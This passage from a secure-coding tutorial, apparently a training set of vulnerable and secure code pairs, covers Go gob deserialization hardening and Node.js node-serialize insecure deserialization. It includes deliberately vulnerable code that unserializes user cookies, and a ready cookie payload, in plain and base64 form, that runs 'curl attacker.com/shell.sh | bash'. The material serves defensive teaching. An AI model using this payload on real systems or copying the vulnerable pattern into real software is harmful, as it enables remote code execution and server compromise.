	r.Body = http.MaxBytesReader(w, r.Body, 4096)

	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields() // Reject unexpected fields

	if err := decoder.Decode(&request); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Validate input
	if !validUsername.MatchString(request.Username) {
		http.Error(w, "Invalid username format", http.StatusBadRequest)
		return
	}

	// Whitelist allowed settings
	sanitizedSettings := make(map[string]string)
	for key, value := range request.Settings {
		if allowedSettings[key] && len(value) <= 100 {
			sanitizedSettings[key] = value
		}
	}

	// Authorization from server-side session, NOT from request
	config := InternalConfig{
		Username:    request.Username,
		IsAdmin:     getIsAdminFromSession(r), // Server-controlled
		Permissions: getPermissionsFromSession(r), // Server-controlled
		Settings:    sanitizedSettings,
	}

	if config.IsAdmin {
		applyAdminSettings(config)
	} else {
		applyUserSettings(config)
	}

	log.Printf("Config updated for user: %s, admin: %v", 
		config.Username, config.IsAdmin)
	w.Write([]byte("Config updated"))
}

func getIsAdminFromSession(r *http.Request) bool {
	// Lookup from authenticated session, not request data
	return false
}

func getPermissionsFromSession(r *http.Request) []string {
	return []string{"read:self"}
}

func applyAdminSettings(config InternalConfig) {}
func applyUserSettings(config InternalConfig) {}

func main() {
	http.HandleFunc("/api/config", updateConfigHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Key Security Controls**:
- **Use JSON instead of gob**: JSON has no type instantiation risks and is human-readable for auditing
- **Separate request DTOs from internal types**: Security-sensitive fields (IsAdmin, Permissions) are never populated from user input
- **Authorization from server state**: Admin status comes from session/token, not request body
- **Input validation with whitelisting**: Only expected settings are processed

For internal service-to-service communication, gob can be appropriate but requires strict controls. The key is ensuring the gob data truly comes from trusted sources through cryptographic verification, not just network boundaries.

**PRODUCTION PATTERN**:

```go
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/gob"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

// Fixed set of allowed types - registered at init
func init() {
	gob.Register(InternalMessage{})
	gob.Register(ServiceHealth{})
	// Do NOT register interface{} or arbitrary types
}

type InternalMessage struct {
	ServiceID   string
	Timestamp   int64
	Action      string
	Payload     []byte
	RequestID   string
}

type ServiceHealth struct {
	ServiceID string
	Status    string
	Uptime    int64
}

// SecureGobCodec handles authenticated gob encoding/decoding
type SecureGobCodec struct {
	secret     []byte
	maxSize    int64
	maxAge     time.Duration
	mu         sync.RWMutex
	seenNonces map[string]time.Time
}

func NewSecureGobCodec(secret []byte) *SecureGobCodec {
	codec := &SecureGobCodec{
		secret:     secret,
		maxSize:    1024 * 1024, // 1MB max
		maxAge:     5 * time.Minute,
		seenNonces: make(map[string]time.Time),
	}
	// Cleanup old nonces periodically
	go codec.cleanupNonces()
	return codec
}

func (c *SecureGobCodec) cleanupNonces() {
	ticker := time.NewTicker(time.Minute)
	for range ticker.C {
		c.mu.Lock()
		now := time.Now()
		for nonce, ts := range c.seenNonces {
			if now.Sub(ts) > c.maxAge*2 {
				delete(c.seenNonces, nonce)
			}
		}
		c.mu.Unlock()
	}
}

// Encode creates signed gob data
func (c *SecureGobCodec) Encode(msg InternalMessage) ([]byte, error) {
	// Set timestamp for replay prevention
	msg.Timestamp = time.Now().Unix()

	var buf bytes.Buffer
	if err := gob.NewEncoder(&buf).Encode(msg); err != nil {
		return nil, fmt.Errorf("gob encode failed: %w", err)
	}

	payload := buf.Bytes()

	// Create HMAC signature
	mac := hmac.New(sha256.New, c.secret)
	mac.Write(payload)
	signature := mac.Sum(nil)

	// Format: [4-byte length][payload][32-byte signature]
	result := make([]byte, 4+len(payload)+32)
	binary.BigEndian.PutUint32(result[0:4], uint32(len(payload)))
	copy(result[4:4+len(payload)], payload)
	copy(result[4+len(payload):], signature)

	return result, nil
}

// Decode verifies signature and decodes gob data
func (c *SecureGobCodec) Decode(data []byte) (*InternalMessage, error) {
	// Minimum size: 4 (length) + 1 (min payload) + 32 (signature)
	if len(data) < 37 {
		return nil, errors.New("data too short")
	}

	if int64(len(data)) > c.maxSize {
		return nil, errors.New("data exceeds maximum size")
	}

	// Extract components
	payloadLen := binary.BigEndian.Uint32(data[0:4])
	if int(payloadLen)+36 != len(data) {
		return nil, errors.New("invalid data format")
	}

	payload := data[4 : 4+payloadLen]
	provided := data[4+payloadLen:]

	// Verify HMAC BEFORE decoding
	mac := hmac.New(sha256.New, c.secret)
	mac.Write(payload)
	expected := mac.Sum(nil)

	if !hmac.Equal(expected, provided) {
		log.Printf("SECURITY: Invalid HMAC signature detected")
		return nil, errors.New("signature verification failed")
	}

	// Now safe to decode - signature verified from trusted source
	var msg InternalMessage
	decoder := gob.NewDecoder(bytes.NewReader(payload))
	if err := decoder.Decode(&msg); err != nil {
		return nil, fmt.Errorf("gob decode failed: %w", err)
	}

	// Verify timestamp to prevent replay attacks
	msgTime := time.Unix(msg.Timestamp, 0)
	if time.Since(msgTime) > c.maxAge {
		return nil, errors.New("message expired")
	}
	if time.Until(msgTime) > time.Minute {
		return nil, errors.New("message from future - clock skew?")
	}

	// Check for replay
	nonce := msg.RequestID
	c.mu.Lock()
	if _, seen := c.seenNonces[nonce]; seen {
		c.mu.Unlock()
		return nil, errors.New("replay attack detected")
	}
	c.seenNonces[nonce] = time.Now()
	c.mu.Unlock()

	return &msg, nil
}

var codec *SecureGobCodec

func internalServiceHandler(w http.ResponseWriter, r *http.Request) {
	// Additional layer: verify mTLS client certificate
	if r.TLS == nil || len(r.TLS.PeerCertificates) == 0 {
		http.Error(w, "mTLS required", http.StatusUnauthorized)
		return
	}

	// Verify client cert is from known internal service
	clientCN := r.TLS.PeerCertificates[0].Subject.CommonName
	if !isAllowedService(clientCN) {
		log.Printf("SECURITY: Rejected request from unknown service: %s", clientCN)
		http.Error(w, "Unauthorized service", http.StatusForbidden)
		return
	}

	// Size limit at HTTP layer
	r.Body = http.MaxBytesReader(w, r.Body, 1024*1024)

	data, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Read error", http.StatusBadRequest)
		return
	}

	msg, err := codec.Decode(data)
	if err != nil {
		log.Printf("SECURITY: Decode failed from %s: %v", clientCN, err)
		http.Error(w, "Invalid message", http.StatusBadRequest)
		return
	}

	log.Printf("Received valid message from %s: action=%s, requestID=%s",
		msg.ServiceID, msg.Action, msg.RequestID)

	// Process message
	processInternalMessage(msg)
	w.Write([]byte("OK"))
}

func isAllowedService(cn string) bool {
	allowed := map[string]bool{
		"auth-service.internal": true,
		"user-service.internal": true,
		"order-service.internal": true,
	}
	return allowed[cn]
}

func processInternalMessage(msg *InternalMessage) {
	// Business logic
}

func main() {
	secret := []byte(os.Getenv("INTERNAL_SIGNING_KEY"))
	if len(secret) < 32 {
		log.Fatal("INTERNAL_SIGNING_KEY must be at least 32 bytes")
	}
	codec = NewSecureGobCodec(secret)

	// Production: Use mTLS server
	http.HandleFunc("/internal/message", internalServiceHandler)
	log.Fatal(http.ListenAndServe(":8443", nil))
}
```

**Defense in Depth Layers**:

1. **mTLS Authentication**: Client certificate verification ensures only known internal services can connect
```go
if r.TLS == nil || len(r.TLS.PeerCertificates) == 0 {
    http.Error(w, "mTLS required", http.StatusUnauthorized)
    return
}
```

2. **HMAC Signature Verification**: Cryptographically verify message authenticity BEFORE deserialization
```go
if !hmac.Equal(expected, provided) {
    return nil, errors.New("signature verification failed")
}
// Only decode AFTER signature is verified
```

3. **Replay Attack Prevention**: Timestamp + nonce tracking prevents message replay
```go
if _, seen := c.seenNonces[nonce]; seen {
    return nil, errors.New("replay attack detected")
}
```

**Additional Protections**:
- **Type registration whitelist**: Only register specific types with gob, never `interface{}`
- **Size limits at multiple layers**: HTTP MaxBytesReader and codec maxSize
- **Clock skew detection**: Reject messages too far in the future
- **Comprehensive audit logging**: Log all security-relevant events with service identity
- **Explicit type definitions**: No dynamic types or reflection-based deserialization
- **Secret key rotation support**: Extend codec to support multiple keys for zero-downtime rotation

Using serialize/unserialize on untrusted data is extremely dangerous and can lead to Remote Code Execution (RCE). Libraries like `node-serialize` allow code execution during deserialization, making this a critical vulnerability.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// VULNERABLE: Deserializing untrusted user input
app.get('/profile', (req, res) => {
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // Dangerous: Deserializing data controlled by the user
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      username: sessionData.username,
      preferences: sessionData.preferences
    });
  } else {
    res.status(401).json({ error: 'No session' });
  }
});

app.post('/login', (req, res) => {
  const { username } = req.body;

  // Serializing user session
  const session = serialize.serialize({
    username: username,
    preferences: { theme: 'dark' },
    createdAt: new Date()
  });

  res.cookie('session', Buffer.from(session).toString('base64'));
  res.json({ success: true });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE (Immediately Invoked Function Expression)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie injection:
// eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2gnKX0oKSJ9
```

**Why This Is Dangerous**:
- `node-serialize` supports serializing functions using `_$$ND_FUNC$$_` marker
- Functions can be auto-executed during deserialization using IIFE syntax `()`
- Attacker controls the cookie content, enabling arbitrary code execution
- Server-side code execution means full system compromise

**SECURE VERSION**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const Joi = require('joi');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Use environment variable for secret
const JWT_SECRET = process.env.JWT_SECRET || 'change-in-production';

// Define strict schema for session data
const sessionSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  preferences: Joi.object({
    theme: Joi.string().valid('dark', 'light').default('light')
  }),
  iat: Joi.number(),
  exp: Joi.number()
});

// SECURE: Using JWT with signature verification
app.get('/profile', (req, res) => {
  const token = req.cookies.session;

  if (!token) {
    return res.status(401).json({ error: 'No session' });
  }

  try {
    // Verify JWT signature - prevents tampering
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'], // Explicitly specify allowed algorithms
      maxAge: '1h'
    });

    // Validate decoded data against schema
    const { error, value } = sessionSchema.validate(decoded);
    if (error) {
      console.error('Invalid session data:', error.details);
      return res.status(400).json({ error: 'Invalid session format' });
    }

    res.json({
      username: value.username,
      preferences: value.preferences
    });
  } catch (err) {
    console.error('JWT verification failed:', err.message);
    res.clearCookie('session');
    return res.status(401).json({ error: 'Invalid session' });
  }
});

app.post('/login', (req, res) => {
  const { username } = req.body;

  // Validate input before storing
  if (!/^[a-zA-Z0-9]{3,30}$/.test(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }

  // Create signed JWT - only primitive data, no functions
  const token = jwt.sign(
    {
      username: username,
      preferences: { theme: 'dark' }
    },
    JWT_SECRET,
    { expiresIn: '1h', algorithm: 'HS256' }
  );

  res.cookie('session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000 // 1 hour
  });

  res.json({ success: true });
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT with signature verification**: Cryptographically ensures data hasn't been tampered with
- **Schema validation with Joi**: Only allows expected data types and values, no functions
- **Explicit algorithm specification**: Prevents algorithm confusion attacks (CVE-2016-10555)
- **Secure cookie flags**: httpOnly, secure, sameSite prevent cookie theft

For complex data structures in microservices, you need a defense-in-depth approach: JSON-only serialization (never eval functions), strict schema validation, integrity signatures, and service-to-service authentication.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json({ limit: '10kb' })); // Limit payload size

// Production logging
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Initialize JSON Schema validator
const ajv = new Ajv({ allErrors: true, removeAdditional: true });
addFormats(ajv);

// Strict schema - NO functions, only primitives and known structures
const cartSchema = {
  type: 'object',
  properties: {
    userId: { type: 'string', pattern: '^[a-f0-9]{24}$' },
    items: {
      type: 'array',
      maxItems: 100,
      items: {
        type: 'object',
        properties: {
          productId: { type: 'string', pattern: '^[a-f0-9]{24}$' },
          quantity: { type: 'integer', minimum: 1, maximum: 99 },
          price: { type: 'number', minimum: 0, maximum: 999999 },
          name: { type: 'string', maxLength: 200 }
        },
        required: ['productId', 'quantity', 'price'],
        additionalProperties: false
      }
    },
    metadata: {
      type: 'object',
      properties: {
        createdAt: { type: 'string', format: 'date-time' },
        updatedAt: { type: 'string', format: 'date-time' },
        sessionId: { type: 'string', maxLength: 64 }
      },
      additionalProperties: false
    }
  },
  required: ['userId', 'items'],
  additionalProperties: false
};

const validateCart = ajv.compile(cartSchema);

// HMAC signing for integrity verification
class SecureSerializer {
  constructor(secret) {
    this.secret = secret;
  }

  // Serialize with integrity signature
  serialize(data) {
    // Step 1: Convert to JSON (no functions, only data)
    const jsonStr = JSON.stringify(data, (key, value) => {
      // Reject any function types
      if (typeof value === 'function') {
        throw new Error('Functions are not allowed in serialization');
      }
      return value;
    });

    // Step 2: Create HMAC signature
    const timestamp = Date.now();
    const payload = `${timestamp}.${jsonStr}`;
    const signature = crypto
      .createHmac('sha256', this.secret)
      .update(payload)
      .digest('hex');

    // Step 3: Return signed payload
    return Buffer.from(JSON.stringify({
      t: timestamp,
      d: jsonStr,
      s: signature
    })).toString('base64');
  }

  // Deserialize with integrity verification
  deserialize(signedData, maxAgeMs = 3600000) {
    try {
      // Step 1: Decode base64
      const decoded = JSON.parse(
        Buffer.from(signedData, 'base64').toString('utf8')
      );

      // Step 2: Verify timestamp (prevent replay attacks)
      const age = Date.now() - decoded.t;
      if (age > maxAgeMs || age < 0) {
        throw new Error('Payload expired or invalid timestamp');
      }

      // Step 3: Verify HMAC signature
      const expectedSignature = crypto
        .createHmac('sha256', this.secret)
        .update(`${decoded.t}.${decoded.d}`)
        .digest('hex');

      if (!crypto.timingSafeEqual(
        Buffer.from(decoded.s, 'hex'),
        Buffer.from(expectedSignature, 'hex')
      )) {
        throw new Error('Invalid signature');
      }

      // Step 4: Parse JSON (safe - no code execution)
      return JSON.parse(decoded.d);
    } catch (err) {
      logger.warn('Deserialization failed', {
        error: err.message,
        dataPreview: signedData.substring(0, 50)
      });
      throw new Error('Invalid or tampered data');
    }
  }
}

// Initialize with secret from environment
const serializer = new SecureSerializer(
  process.env.SERIALIZATION_SECRET || crypto.randomBytes(32).toString('hex')
);

// Rate limiting
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});

app.use('/api/', apiLimiter);

// Service-to-service endpoint with full validation
app.post('/api/cart/sync', (req, res) => {
  const { signedCart, serviceToken } = req.body;

  // Defense Layer 1: Verify service-to-service token
  if (!verifyServiceToken(serviceToken)) {
    logger.warn('Invalid service token', {
      ip: req.ip,
      headers: req.headers['x-forwarded-for']
    });
    return res.status(403).json({ error: 'Unauthorized service' });
  }

  try {
    // Defense Layer 2: Deserialize with signature verification
    const cartData = serializer.deserialize(signedCart);

    // Defense Layer 3: Schema validation
    if (!validateCart(cartData)) {
      logger.warn('Schema validation failed', {
        errors: validateCart.errors,
        userId: cartData.userId
      });
      return res.status(400).json({
        error: 'Invalid cart format',
        details: validateCart.errors
      });
    }

    // Defense Layer 4: Business logic validation
    const totalValue = cartData.items.reduce(
      (sum, item) => sum + (item.price * item.quantity), 0
    );
    if (totalValue > 1000000) {
      logger.warn('Suspicious cart value', {
        userId: cartData.userId,
        totalValue
      });
      return res.status(400).json({ error: 'Cart value exceeds limit' });
    }

    // Safe to process
    logger.info('Cart synchronized', {
      userId: cartData.userId,
      itemCount: cartData.items.length
    });

    res.json({ success: true, cartId: cartData.userId });

  } catch (err) {
    logger.error('Cart sync failed', {
      error: err.message,
      ip: req.ip
    });
    return res.status(400).json({ error: 'Invalid cart data' });
  }
});

// Simple service token verification (use proper JWT/mTLS in production)
function verifyServiceToken(token) {
  const validTokens = (process.env.SERVICE_TOKENS || '').split(',');
  return token && validTokens.includes(token);
}

// Health check without sensitive data
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  logger.info(`Server started on port ${PORT}`);
});
```

**Defense in Depth Layers**:

1. **JSON-Only Serialization** - Never deserialize executable code
